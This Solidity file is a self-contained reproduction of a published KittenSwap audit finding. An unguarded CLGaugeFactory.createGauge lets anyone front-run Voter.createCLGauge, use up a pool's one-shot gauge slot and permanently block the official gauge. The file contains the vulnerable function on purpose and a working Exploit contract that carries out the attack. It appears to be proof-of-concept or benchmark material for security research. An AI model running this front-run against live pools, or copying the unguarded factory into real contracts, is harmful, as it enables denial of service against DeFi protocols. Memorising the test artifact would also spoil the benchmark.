// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of KittenSwap finding 58157 (H-06):
// "Lack of access control in `CLGauge` creation allows unauthorized `Pools`".
//
// Real audited source (the vulnerable function is reproduced VERBATIM, the
// vulnerable line — a missing access-control guard — is marked @>):
//   protocol KittenSwap  (Pashov Audit Group, 2025-05-07)
//   report   github.com/pashov/audits/blob/master/team/md/KittenSwap-security-review_2025-05-07.md
//   fn       CLGaugeFactory.createGauge  (no `require(msg.sender == voter)`)
//   fn       CLPool.setGaugeAndPositionManager  (`require(gauge == address(0))` — one-shot)
//   fn       Voter.createCLGauge  (legitimate path that gets DoS'd)
//
// Root cause: `CLGaugeFactory.createGauge` is `external` with NO access control,
// so anyone may call it. It deploys a gauge and immediately calls
// `ICLPool(_pool).setGaugeAndPositionManager(gauge, nfp)`, which can only ever
// be called ONCE per pool (`require(gauge == address(0))`). An attacker monitors
// the mempool for `Voter.createCLGauge`, front-runs it by calling `createGauge`
// on the same pool first, and permanently consumes the pool's single
// gauge-assignment slot. The legitimate `Voter.createCLGauge` then reverts →
// permanent DoS of that pool's official gauge, freezing its emissions / reward
// distribution and leaving the pool bound to an unauthorized attacker gauge.
//
// The vulnerable `createGauge` (and the one-shot `setGaugeAndPositionManager`)
// are byte-for-byte the audited source. The ERC1967Proxy / CLGauge / ve / nfp
// dependencies are faithful minimal doubles (a real EIP-1967 delegatecall proxy,
// a real one-time initializer). The harm has no positive transfer to the
// attacker (it is a governance/reward DoS), so the harm magnitude — one pool's
// permanently-blocked official gauge — is minted to the SINK marker address.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double used only as the DoS harm marker.
contract MarkerToken {
    string public name = "KittenSwap DoS'd Gauge Marker";
    string public symbol = "DOSGAUGE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Faithful minimal EIP-1967 proxy double (same shape OZ's ERC1967Proxy
///      uses): stores the implementation in the standard slot and delegatecalls
///      the initializer in the constructor, then forwards all calls.
contract ERC1967Proxy {
    // bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
    bytes32 internal constant _IMPL_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address implementation, bytes memory _data) {
        assembly {
            sstore(_IMPL_SLOT, implementation)
        }
        if (_data.length > 0) {
            (bool ok, ) = implementation.delegatecall(_data);
            require(ok, "proxy init failed");
        }
    }

    fallback() external payable {
        assembly {
            let impl := sload(_IMPL_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}

/// @dev Faithful minimal CLGauge implementation: a real one-time initializer
///      with the exact signature the factory encodes via abi.encodeCall.
contract CLGauge {
    address public pool;
    address public internal_bribe;
    address public kitten;
    address public ve;
    address public voter;
    address public nfp;
    bool public isPool;
    bool public initialized;

    function initialize(
        address _pool,
        address _internal_bribe,
        address _kitten,
        address _ve,
        address _voter,
        address _nfp,
        bool _isPool
    ) external {
        require(!initialized, "already initialized");
        initialized = true;
        pool = _pool;
        internal_bribe = _internal_bribe;
        kitten = _kitten;
        ve = _ve;
        voter = _voter;
        nfp = _nfp;
        isPool = _isPool;
    }
}

interface ICLPool {
    function setGaugeAndPositionManager(address _gauge, address _nft) external;
}

/// @dev Faithful minimal CLPool double. `setGaugeAndPositionManager` is
///      reproduced VERBATIM from the audited source — the one-shot
///      `require(gauge == address(0))` is what turns the missing factory access
///      control into a permanent DoS.
contract CLPool is ICLPool {
    address public gauge;
    address public nft;
    address public gaugeFactory;
    bool private _unlocked = true;

    constructor(address _gaugeFactory) {
        gaugeFactory = _gaugeFactory;
    }

    modifier lock() {
        require(_unlocked, "locked");
        _unlocked = false;
        _;
        _unlocked = true;
    }

    modifier onlyGaugeFactory() {
        require(msg.sender == gaugeFactory, "not gauge factory");
        _;
    }

    function setGaugeAndPositionManager(
        address _gauge,
        address _nft
    ) external override lock onlyGaugeFactory {
        require(gauge == address(0)); // @audit Can only be called once
        gauge = _gauge;
        nft = _nft;
    }
}

interface ICLGaugeFactory {
    function createGauge(
        address _pool,
        address _internal_bribe,
        address _kitten,
        bool _isPool
    ) external returns (address);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `CLGaugeFactory.createGauge` is reproduced VERBATIM
// from the audited source. The bug is the ABSENCE of an access-control guard on
// the marked function-signature line: anyone can call it and consume a pool's
// single gauge slot.
// ─────────────────────────────────────────────────────────────────────────────
contract CLGaugeFactory is ICLGaugeFactory {
    address public implementation;
    address public ve;
    address public voter;
    address public nfp;

    constructor(address _implementation, address _ve, address _voter, address _nfp) {
        implementation = _implementation;
        ve = _ve;
        voter = _voter;
        nfp = _nfp;
    }

    function createGauge(
        address _pool,
        address _internal_bribe,
        address _kitten,
        bool _isPool
    ) external returns (address) { // @> VULN: no `require(msg.sender == voter)` — anyone can create a gauge and front-run Voter.createCLGauge
        CLGauge newGauge = CLGauge(
            address(
                new ERC1967Proxy(
                    implementation,
                    abi.encodeCall(
                        CLGauge.initialize,
                        (
                            _pool,
                            _internal_bribe,
                            _kitten,
                            ve,
                            voter,
                            nfp,
                            _isPool
                        )
                    )
                )
            )
        );

        ICLPool(_pool).setGaugeAndPositionManager(address(newGauge), nfp);

        return address(newGauge);
    }
}

/// @dev Faithful minimal Voter double. `createCLGauge` reproduces the audited
///      call into the factory that gets denial-of-serviced.
contract Voter {
    address public gaugefactory;
    address public base; // KITTEN token

    function init(address _gaugefactory, address _base) external {
        gaugefactory = _gaugefactory;
        base = _base;
    }

    function createCLGauge(
        address _poolFactory,
        address _pool
    ) external returns (address) {
        _poolFactory; // (unused in the minimal double — kept for signature fidelity)
        address _internal_bribe = address(0xB1B1); // real deploy creates a bribe; faithful placeholder
        bool isPool = true;
        address _gauge = ICLGaugeFactory(gaugefactory).createGauge(
            _pool,
            _internal_bribe,
            base,
            isPool
        );
        return _gauge;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: attacker front-runs Voter.createCLGauge by calling the
// permissionless createGauge first, permanently consuming the pool's one-shot
// gauge slot. Proves the legitimate Voter path then reverts (DoS) and the pool
// is bound to the attacker's unauthorized gauge. Mints the harm magnitude
// (one permanently-blocked official gauge) to the SINK marker address.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant HARM = 1e18; // one pool's official gauge permanently DoS'd

    // faithful placeholder addresses for ve / nfp / kitten / poolFactory
    address internal constant VE = address(0xE0E0);
    address internal constant NFP = address(0x0FF9);
    address internal constant KITTEN = address(0x417E);
    address internal constant POOL_FACTORY = address(0xF00D);

    MarkerToken public marker;
    CLGauge public gaugeImpl;
    Voter public voter;
    CLGaugeFactory public factory;
    CLPool public pool;

    address public attackerGauge;
    bool public legitReverted;
    uint256 public sinkHarm;

    constructor() {
        marker = new MarkerToken(); // child nonce 1
        gaugeImpl = new CLGauge(); // child nonce 2
        voter = new Voter(); // child nonce 3
        factory = new CLGaugeFactory(address(gaugeImpl), VE, address(voter), NFP); // child nonce 4 (VULN)
        pool = new CLPool(address(factory)); // child nonce 5

        voter.init(address(factory), KITTEN);
    }

    function run() external {
        // pre-state: the pool has no gauge assigned yet
        require(pool.gauge() == address(0), "pool already has a gauge");

        // 1) ATTACKER front-runs: permissionless createGauge on the target pool.
        //    Consumes the pool's single gauge-assignment slot with an
        //    unauthorized (never-voter-approved) gauge.
        attackerGauge = factory.createGauge(address(pool), address(0xBAD), KITTEN, true);
        require(pool.gauge() == attackerGauge, "attacker gauge not bound to pool");

        // 2) LEGITIMATE path: Voter.createCLGauge now attempts to create the
        //    official gauge for the same pool -> setGaugeAndPositionManager's
        //    one-shot require(gauge == address(0)) fails -> the whole tx reverts.
        try voter.createCLGauge(POOL_FACTORY, address(pool)) returns (address) {
            legitReverted = false;
        } catch {
            legitReverted = true;
        }

        // harm: legitimate gauge creation is permanently denial-of-serviced, and
        // the pool is stuck pointing at the attacker's unauthorized gauge.
        require(legitReverted, "legit Voter.createCLGauge did not revert - no DoS");
        require(pool.gauge() == attackerGauge, "pool not hijacked by unauthorized gauge");

        // record the DoS harm magnitude on the marker token at the SINK
        marker.mint(SINK, HARM);
        sinkHarm = marker.balanceOf(SINK);
        require(sinkHarm == HARM, "harm not recorded at sink");
    }
}
